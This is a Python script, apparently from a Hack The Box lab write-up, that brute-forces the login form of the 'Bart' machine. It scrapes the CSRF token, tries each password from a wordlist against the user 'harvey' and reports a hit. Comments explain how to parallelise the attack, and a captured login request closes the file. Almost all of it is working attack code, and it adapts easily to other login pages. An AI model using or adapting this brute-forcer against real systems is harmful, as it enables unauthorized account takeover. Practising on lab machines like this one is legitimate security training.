#!/usr/bin/python3

"""
Code created to Brute force users and login in Bart box from Hackthebox.
This code was created with the help of g0tmi1k and ippsec.

Video Español: https://youtu.be/nnqvCEUJxIc
ippsec code: https://www.youtube.com/watch?v=d2nVDoVr0jE&t=2520s
g0tmi1k code: https://blog.g0tmi1k.com/dvwa/bruteforce-high/

Usage: Brute Force Login
python3 bart-bruteforce.py passlist.txt

If you need to create multiple threads you can use bash script

1. Split the password list file into multiples files with split.
	split -l 20 -d passlist.txt
	
2. Use bash and a for loop
	for n in $(seq 0 8); do python3 bart-bruteforce.py x0$n & done
"""

import sys
import requests
import re
from bs4 import BeautifulSoup

# Define some variables 
url = 'http://bart.htb/monitor/'
username = "harvey"

# Load Password File 
passwordfile = open(sys.argv[1])
print("[+] Password File Loaded")

s = requests.session()
r = s.get(url)

soup = BeautifulSoup(r.text, "lxml")
csrf = soup("input", {"name": "csrf"})[0]["value"]

# Post Request
for password in passwordfile: 
	# Create the post data arguments 
    login = {
        "csrf": csrf,
        "user_name": username,
        "user_password": password,
        "action": "login"
    }

	# Post request Execution
    r = s.post(url,data=login)

	# Validate if Login was successful or not 
    if "The information is incorrect" in r.text:
		# Uncomment to view fail attempts
        #print("login Fail with password: " + password)
		None
    else:
        print("[+] Login Success!")
        print("[+] Username: " + username)
        print("[+] Password: " + password)
        break


"""
Login Request

POST /monitor/ HTTP/1.1
Host: bart.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://bart.htb/monitor/
Cookie: PHPSESSID=2eo09br9rtkvs2sqrvkt67bhsp
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 124

csrf=c16964fd30ab19feb3268587f136d5806e424ff4ba275bc4e08a176e50045f87&user_name=USERNAME&user_password=PASSWORD&action=login
""" 